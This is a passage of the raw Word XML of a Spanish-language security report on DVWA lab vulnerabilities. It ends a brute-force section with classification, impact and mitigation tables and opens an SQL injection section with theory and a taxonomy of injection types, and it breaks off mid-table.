            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="40938088" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detalle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="2E205492" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7C0C8AA5" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>CWE-307</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="082FD58E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Improper Restriction of Excessive Authentication Attempts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="5C1C33A2" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="2959306B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>CWE-916</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="5DA3485E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Use of Password Hash With Insufficient Computational Effort (MD5 sin salt)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="77FDF65C" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="40F5C6DC" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>CWE-521</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FDACD2D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Weak Password Requirements</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="7968E8F2" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="64E11E68" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>OWASP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="2B5866B5" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>A07:2021 – Identification and Authentication Failures</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="6087DE82" w14:textId="77777777" w:rsidTr="00CC453F">
        <w:trPr>
          <w:trHeight w:val="309"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48BD78C9" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>CVSS v4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27CF8E03" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CC453F" w:rsidRDefault="009E1026">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC453F">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>~7.5 High (red interna) / ~9.8 Critical (exposición pública)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="576FFDC3" w14:textId="33972899" w:rsidR="00AE5F76" w:rsidRDefault="00E64671">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00AD120E">
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Impacto esperado en un sistema real</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2877"/>
        <w:gridCol w:w="2876"/>
        <w:gridCol w:w="2877"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="020547BC" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="7E670830" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dimensión CIA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="51B21E49" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Impacto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="3940B24F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Justificación</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="78200E0A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1F9DB245" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Confidencialidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7FCCB2AB" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ALTO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AEF4467" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Acceso a información privada del usuario: datos personales, historial, mensajes, documentos.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="48E6D7D4" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="00C781C2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Integridad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="00C9A727" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ALTO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="531E3512" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>El atacante puede modificar datos, realizar transacciones o cambiar configuraciones en nombre de la víctima.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="5FCB57B7" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5AF2BAE7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Disponibilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CF9166C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>MEDIO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6ADDF34A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>En sistemas con lockout (que DVWA no tiene), bloquear cuentas legítimas causa DoS selectivo.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16F0EECF" w14:textId="26B6E095" w:rsidR="00AE5F76" w:rsidRDefault="00AD120E">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>7.8</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Propuesta de mitigación</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3406412F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Account lockout:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> bloquear la cuenta por 15 minutos tras 5 intentos fallidos consecutivos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFF7493" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Rate limiting por IP</w:t>
      </w:r>
      <w:r>
        <w:t>: máximo N solicitudes de login por minuto desde la misma fuente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592816B3" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:t>: incorporar tras 3 intentos fallidos para impedir la automatización.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FBAF0F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>MFA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Autenticación Multifactor): el segundo factor protege incluso si la contraseña es comprometida.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F77D114" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Algoritmos seguros de hashing</w:t>
      </w:r>
      <w:r>
        <w:t>: bcrypt, argon2id o scrypt con salt aleatorio automático.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129CC535" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Usar método POST para formularios de login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (las credenciales no quedan en la URL ni en logs HTTP).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AF6FB3" w14:textId="26C0068B" w:rsidR="00AE5F76" w:rsidRDefault="009E1026" w:rsidP="00CC453F">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC453F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Monitorización</w:t>
      </w:r>
      <w:r>
        <w:t>: alertar al equipo SOC ante múltiples intentos fallidos desde una IP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5CCF4F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilidad 8 — SQL Injection &amp; SQL Injection (Blind)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568A0D1F" w14:textId="147129A1" w:rsidR="00AE5F76" w:rsidRDefault="00CC453F">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.1 </w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>Teoría</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09264F2F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La inyección SQL es probablemente la vulnerabilidad web más estudiada y documentada de la historia, y aun así continúa siendo una de las más prevalentes. Ocurre cuando datos proporcionados por el usuario se insertan directamente en una consulta SQL sin parametrización, permitiendo al atacante alterar la lógica de la consulta o inyectar sentencias SQL adicionales.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB8674A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="465F319D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>El problema fundamental es la mezcla de código (SQL) con datos (input del usuario) en una misma cadena de texto. El motor de base de datos no puede distinguir si una comilla simple que aparece en la cadena fue puesta por el programador o por un atacante.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFF228F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="72DDAF93" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Taxonomía de SQL Injection:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2875"/>
        <w:gridCol w:w="2879"/>
        <w:gridCol w:w="2876"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="41C54A4A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="3DA57C42" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Tipo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="109CD283" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Descripción</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="6B449998" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Indicador</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="5D64EFC6" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48BFCC47" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>In-band / Error-based</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="010CA001" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>La aplicación devuelve los datos extraídos directamente en la respuesta o muestra mensajes de error SQL detallados.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C630287" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Errores SQL visibles en la página</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="428B6538" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="044F7878" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>In-band / UNION-based</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="77CD3888" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>El atacante usa UNION SELECT para combinar la query original con una query maliciosa y obtener datos en la respuesta.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="16FEA84E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>La respuesta muestra filas adicionales de tablas no esperadas</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="2740DAE9" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78B6E79D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Blind Boolean-based</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1BE05CCF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>La aplicación no devuelve datos pero responde de forma diferente ante condiciones verdaderas o falsas (mensaje/comportamiento).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="095544E6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dos respuestas distintas según el resultado de la condición</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="7E7E16AC" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7E1AEEB0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Blind Time-based</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="6A43D22B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>La aplicación no varía su respuesta, pero el atacante infiere datos por el tiempo que tarda en responder usando SLEEP().</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="46E29BC1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Demoras en la respuesta correlacionadas con condiciones</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="1EEB5948" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4638C357" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Out-of-band</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0AAAA804" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
